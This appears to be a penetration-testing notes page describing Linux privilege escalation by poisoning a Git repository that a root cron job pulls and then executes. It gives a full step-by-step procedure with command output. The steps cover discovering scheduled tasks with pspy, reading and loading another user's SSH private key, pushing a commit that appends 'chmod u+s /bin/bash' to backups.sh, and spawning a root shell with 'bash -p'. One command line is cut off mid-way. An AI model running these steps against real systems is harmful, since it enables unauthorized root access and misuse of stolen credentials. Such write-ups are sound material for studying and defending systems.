---
Primary_category: "[[LINUX PRIVESC]]"
title: "GIT ABUSE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LINUX PRIVESC]]

#### *Abusing Writable Git Hooks*

> 🛠️⌛

---

#### *Cron-Driven Git Repository Poisoning*

##### *Theory*

This attack occurs when a privileged user periodically synchronizes a local working tree with a *GIT* repository and subsequently executes a file from the updated working tree.

If an attacker can push changes to the trusted repository, they can modify the executed file without requiring direct write permissions over the privileged working tree.

The complete execution flow is:

- ***The attacker pushes a malicious commit to a Git repository***

- ***A privileged scheduled task pulls the commit into another working tree***

> ***e.g. A CRON Job run as `root`***

- ***A second privileged task executes the modified file***

- ***The attacker's code consequently runs with the privileges of the scheduled task***

In this scenario, **`/git-server`** is a *bare repository*. A bare repository contains Git metadata directly in its root and does not have a checked-out working tree or a separate **`.git/`** directory.

A restricted **`git-shell`** does not provide an interactive system shell. However, it intentionally allows the server-side Git commands required by operations such as **`clone`**, **`fetch`** and **`push`**:

- **`git-upload-pack`** — ***Sends repository objects during clone and fetch operations***

- **`git-receive-pack`** — ***Receives objects and updates references during push operations***

- **`git-upload-archive`** — ***Provides remote Git archives***

Therefore, escaping from **`git-shell`** is unnecessary. A valid SSH identity for the **`git`** user can be used directly by the Git client.

> ***This technique does not abuse Git hooks. The attacker modifies a tracked file that a privileged process later pulls and executes.***

##### *Requirements*

- ***A privileged scheduled task must periodically update a working tree from a Git repository***

- ***A privileged process must subsequently execute a tracked file from that updated working tree***

- ***The attacker must be able to push commits to the branch used by the privileged working tree***

- ***The modified file must be executed after the malicious commit has been pulled***

- ***The attacker must control a repository identity with permission to update the relevant remote reference***

##### *Enumeration*

###### *Discovering Scheduled Tasks*

First, we check the standard *Cron* configuration locations →

```bash
cat /etc/crontab
ls -la /etc/cron.d
ls -la /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly
```

But we get nothing

Then, we discover a backup file named **`/etc/crontab.bak`**:

```bash
cat /etc/crontab.bak
```

> [!DANGER]- */etc/crontab.bak*
>
> ```bash
> */3 * * * * /root/git-server/backups.sh
> */2 * * * * /root/pull.sh
> ```

The file suggests that one task updates a repository and another executes **`backups.sh`**.

However, a **`.bak`** file is not automatically processed by *Cron* and does not prove that the tasks are currently active.

###### *Monitoring Scheduled Processes*

Therefore, we can upload a  ***[pspy](https://github.com/dominicbreuker/pspy)*** binary to confirm the real processes, execution order and effective user

```bash
chmod +x pspy
./pspy
```

> [!TLDR]- *Command Output*
>
> ```bash
> <SNIP>
> 2026/10/22 17:32:01 CMD: UID=0 PID=3261 | /bin/sh -c /root/pull.sh
> 2026/10/22 17:32:01 CMD: UID=0 PID=3264 | git-upload-pack '/git-server'
> 2026/10/22 17:32:01 CMD: UID=0 PID=3265 | /usr/lib/git-core/git rev-list --objects --stdin --not --all --quiet --alternate-refs
> 2026/10/22 17:32:01 CMD: UID=0 PID=3267 | /usr/lib/git-core/git maintenance run --auto --no-quiet
> <SNIP>
> 2026/10/22 17:33:01 CMD: UID=0 PID=3272 | /bin/bash /root/git-server/backups.sh
> <SNIP>
> ```

The **`UID=0`** entries confirm that *ROOT*:

- ***Executes*** **`/root/pull.sh`**

- ***Reads objects from*** **`/git-server`**

- ***Executes*** **`/root/git-server/backups.sh`**

The process information establishes the relevant trust relationship:

```bash
/git-server
        │
        │ ROOT pulls changes
        ▼
/root/git-server
        │
        │ ROOT executes backups.sh
        ▼
Privileged command execution
```

###### *Identifying the Bare Repository*

Inspect **`/git-server`**:

```bash
ls -la /git-server
```

> [!TLDR]- *Command Output*
>
> ```bash
> drwxr-xr-x  7 git  git  4096 Oct 22 16:37 .
> drwxr-xr-x 18 root root 4096 Nov 10  2020 ..
> -rw-r--r--  1 git  git    23 Nov  5  2020 HEAD
> drwxr-xr-x  2 git  git  4096 Nov  5  2020 branches
> -rw-r--r--  1 git  git    66 Nov  5  2020 config
> -rw-r--r--  1 git  git    73 Nov  5  2020 description
> drwxr-xr-x  2 git  git  4096 Nov  5  2020 hooks
> drwxr-xr-x  2 git  git  4096 Nov  5  2020 info
> drwxr-xr-x 24 git  git  4096 Oct 22 16:37 objects
> drwxr-xr-x  4 git  git  4096 Nov  5  2020 refs
> ```

The presence of **`HEAD`**, **`objects/`**, **`refs/`** and **`config`** directly inside the directory indicates that it is a *bare Git* repository

###### *Inspecting the Repository Contents*

If the repository is readable, we can create a temporary read-only clone →

```bash
git clone 'file:///git-server' /tmp/git-recon
```

Inspect the checked-out files:

```bash
ls -la /tmp/git-recon
```

> [!TLDR]- *Command Output*
>
> ```bash
> drwxr-xr-x 3 dademola dademola 120 Oct 22 17:05 .
> drwxrwxrwt 9 root     root     220 Oct 22 17:05 ..
> drwxr-xr-x 8 dademola dademola 260 Oct 22 17:05 .git
> -rw-r--r-- 1 dademola dademola   0 Oct 22 17:05 NEW_CHANGE
> -rw-r--r-- 1 dademola dademola  63 Oct 22 17:05 README
> -rwxr-xr-x 1 dademola dademola  77 Oct 22 17:05 backups.sh
> ```

The clone contains **`backups.sh`**, which matches the file executed by *ROOT* from **`/root/git-server/backups.sh`**.

Inspect its current content:

```bash
cat /tmp/git-recon/backups.sh
```

> [!TLDR]- *Command Output*
>
> ```bash
> #!/bin/bash
> 
> <LEGITIMATE_COMMANDS>
> ```

###### *Checking Repository Write Permissions*

Check every component of the repository path:

```bash
namei -l /git-server
```

Check whether the current user can create files directly inside it:

```bash
test -w /git-server && echo 'Writable' || echo 'Not writable'
```

> [!TLDR]- *Command Output*
>
> ```bash
> Not writable
> ```

The repository and its objects are owned by **`git:git`**. Our current user can read and clone the repository but cannot directly modify its objects, references or hooks.

###### *Discovering the Git User's SSH Key*

Inspect the Git user's SSH directory:

```bash
namei -l /home/git/.ssh
ls -la /home/git/.ssh
```

> [!TLDR]- *Command Output*
>
> ```bash
> drwx------ 2 git git 4096 Nov 10 2020 .
> drwxr-xr-x 4 git git 4096 Nov 10 2020 ..
> -rw------- 1 git git 1679 Nov 10 2020 id_rsa
> -rw-r--r-- 1 git git  395 Nov 10 2020 id_rsa.pub
> -rw------- 1 git git  395 Nov 10 2020 authorized_keys
> ```

Verify that the private key is readable:

```bash
test -r /home/git/.ssh/id_rsa && 
```

> [!TLDR]- *Command Output*
>
> ```bash
> Readable
> ```

A readable private key can be used only if its corresponding public key is trusted by the SSH service and the key is not protected by an unknown passphrase.

###### *Inspecting the Git Login Shell*

Attempting an interactive SSH connection as **`git`** lands in the restricted **`git-shell`** environment or is rejected:

```bash
ssh -p <SSH_PORT> -i /home/git/.ssh/id_rsa git@localhost
```

> [!TLDR]- *Command Output*
>
> ```bash
> fatal: Interactive git shell is not enabled.
> Connection to localhost closed.
> ```

This restriction does not prevent *Git* operations. *Git* communicates through explicitly permitted server-side commands instead of requiring an interactive shell.

##### *Abuse*

###### *Importing the Key into SSH-Agent*

Start an SSH agent for the current shell:

```bash
eval "$( ssh-agent )"
```

Import the Git user's private key:

```bash
ssh-add /home/git/.ssh/id_rsa
```

> [!TLDR]- *Command Output*
>
> ```bash
> Identity added: /home/git/.ssh/id_rsa
> ```

Confirm that the identity is loaded:

```bash
ssh-add -l
```

> [!TLDR]- *Command Output*
>
> ```bash
> <BITS> SHA256:<FINGERPRINT> /home/git/.ssh/id_rsa (RSA)
> ```

The agent provides the private key automatically when Git establishes its SSH connection

###### *Cloning the Repository through SSH*

Clone the bare repository through *SSH* as the **`git`** user →

```bash
rm -rf /tmp/git-server
git clone 'ssh://git@localhost:<SSH_PORT>/git-server' /tmp/git-server
```

When using the **`ssh://`** URL format, the path after the host and port is interpreted as an absolute path on the remote system.

During the clone, *Git* effectively requests the following restricted command through *SSH*:

```bash
git-upload-pack '/git-server'
```

This command is allowed by **`git-shell`**.

Inspect the configured remote and current branch:

```bash
git -C /tmp/git-server remote -v
git -C /tmp/git-server branch --show-current
git -C /tmp/git-server status
```

> [!TLDR]- *Command Output*
>
> ```bash
> origin  ssh://git@localhost:<SSH_PORT>/git-server (fetch)
> origin  ssh://git@localhost:<SSH_PORT>/git-server (push)
> master
> On branch master
> Your branch is up to date with 'origin/master'.
> 
> nothing to commit, working tree clean
> ```

###### *Adding the Payload*

Append a command that adds the SUID permission to **`/bin/bash`**:

```bash
printf '\n/usr/bin/chmod u+s /bin/bash\n' >> /tmp/git-server/backups.sh
```

> ***The filename is `backups.sh`. Using `backups.bash` would modify a different file that the privileged task does not execute.***

###### *Committing the Change*

- ***Configure a repository-local Git identity***

```bash
git -C /tmp/git-server config --local user.name '0xkholod'
git -C /tmp/git-server config --local user.email '0xkholod@pwned.com'
```

- ***Stage only the modified script***

```bash
git -C /tmp/git-server add -- backups.sh
```

- ***Create the commit:***

```bash
git -C /tmp/git-server commit -m 'Update backup script'
```

> [!TLDR]- *Command Output*
>
> ```bash
> [master <COMMIT_ID>] Update backup script
>  1 file changed, 2 insertions(+)
> ```

###### *Pushing the Malicious Commit*

Push the current branch to the bare repository:

```bash
git -C /tmp/git-server push origin HEAD
```

The command runs as the **`git`** operating-system user. Since that user owns **`/git-server`**, Git can write the new objects and update the branch reference.

> [!TLDR]- *Command Output*
>
> ```bash
> Enumerating objects: <COUNT>, done.
> Counting objects: 100% (<COUNT>/<COUNT>), done.
> Writing objects: 100% (<COUNT>/<COUNT>), done.
> To ssh://localhost:<SSH_PORT>/git-server
>    <OLD_COMMIT>..<NEW_COMMIT>  HEAD -> master
> ```

The push updates the repository history. It does not directly modify the files inside **`/root/git-server`**.

###### *Waiting for the Privileged Pull*

Monitor the processes again:

```bash
./pspy
```

The first scheduled task should retrieve the malicious commit:

> [!TLDR]- *Command Output*
>
> ```bash
> <SNIP>
> 2026/10/22 17:38:01 CMD: UID=0 PID=<PID> | /bin/sh -c /root/pull.sh
> 2026/10/22 17:38:01 CMD: UID=0 PID=<PID> | git-upload-pack '/git-server'
> <SNIP>
> ```

The privileged working tree should now contain the modified version of **`backups.sh`**.

A successful push alone is insufficient. The attack works only after *ROOT* pulls the pushed commit into **`/root/git-server`**.

###### *Waiting for Privileged Execution*

The second scheduled task executes the updated script:

> [!TLDR]- *Command Output*
>
> ```bash
> <SNIP>
> 2026/10/22 17:39:01 CMD: UID=0 PID=<PID> | /bin/bash /root/git-server/backups.sh
> 2026/10/22 17:39:01 CMD: UID=0 PID=<PID> | /usr/bin/chmod u+s /bin/bash
> <SNIP>
> ```

Since the script is executed with **`UID=0`**, the appended command runs as *ROOT*.

###### *Verifying the Payload*

Check the permissions of **`/bin/bash`**:

```bash
ls -l /bin/bash
```

> [!TLDR]- *Command Output*
>
> ```bash
> -rwsr-xr-x 1 root root <SIZE> <DATE> /bin/bash
> ```

Spawn *Bash* while preserving its effective user ID:

```bash
/bin/bash -p
```

Verify the resulting privileges:

```bash
id
```

> [!TLDR]- *Command Output*
>
> ```bash
> uid=<USER_ID>(dademola) gid=<GROUP_ID>(dademola) euid=0(root) groups=<GROUPS>
> ```

The **`-p`** option is required because Bash normally drops elevated effective privileges when real and effective user IDs differ.